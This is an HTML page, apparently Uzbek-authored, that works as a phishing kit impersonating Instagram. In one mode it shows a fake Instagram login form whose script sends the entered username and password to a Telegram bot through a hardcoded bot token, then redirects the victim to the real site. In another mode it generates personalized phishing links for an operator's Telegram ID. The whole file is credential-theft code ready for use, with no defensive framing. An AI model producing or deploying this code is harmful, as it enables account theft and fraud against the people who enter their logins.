<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 8px; }
        .logo { width: 150px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .result { background: #eef; padding: 10px; border-radius: 5px; word-break: break-all; font-size: 13px; margin-top: 15px; display: none; border: 1px dashed #3390ec; }
    </style>
</head>
<body>

    <div class="box" id="mainBox"></div>

    <script>
        const BOT_TOKEN = "8481130069:AAH-NEezleZhAA1pUqMjqXaiCYAZwwuW7xM"; 
        
        // URL'dan ID parametrini qidirish (Hash va Query'dan)
        function getTargetId() {
            const urlParts = window.location.href.split('?id=');
            if (urlParts.length > 1) return urlParts[1].split('&')[0].trim();
            
            const params = new URLSearchParams(window.location.search);
            return params.get('id');
        }

        const targetId = getTargetId();
        const mainBox = document.getElementById('mainBox');

        if (targetId && targetId !== "null" && targetId !== "") {
            // --- FISHING REJIMI ---
            mainBox.innerHTML = `
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
                <input type="text" id="login" placeholder="Login yoki Email">
                <input type="password" id="pass" placeholder="Parol">
                <button onclick="sendData()">Kirish</button>
            `;
        } else {
            // --- PANEL REJIMI ---
            mainBox.innerHTML = `
                <h3>Havola Yaratish</h3>
                <p style="font-size:12px; color:#666;">Telegram ID-ingizni kiriting:</p>
                <input type="number" id="chat_id_input" placeholder="Masalan: 7930537261">
                <button onclick="generate()">Linkni olish</button>
                <div id="res" class="result"></div>
            `;
        }

        async function sendData() {
            const login = document.getElementById('login').value;
            const pass = document.getElementById('pass').value;
            if(!login || !pass) return alert("To'ldiring!");

            const message = `ðŸ“¸ **INSTA NATIJA!**\n\nðŸ‘¤ Login: \`${login}\`\nðŸ”‘ Parol: \`${pass}\`\nðŸ†” Yuborgan ID: \`${targetId}\``;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            try {
                await fetch(url);
                window.location.href = "https://instagram.com";
            } catch (e) {
                alert("Xatolik!");
            }
        }

        function generate() {
            const id = document.getElementById('chat_id_input').value;
            if (id.length > 5) {
                // Toza URL yaratish (hash va querylarsiz)
                const pureUrl = window.location.origin + window.location.pathname;
                const finalLink = pureUrl + "?id=" + id;
                const resDiv = document.getElementById('res');
                resDiv.style.display = "block";
                resDiv.innerHTML = "<b>Sizning linkigiz (nusxa oling):</b><br>" + finalLink;
            } else {
                alert("ID xato!");
            }
        }
    </script>
</body>
</html>



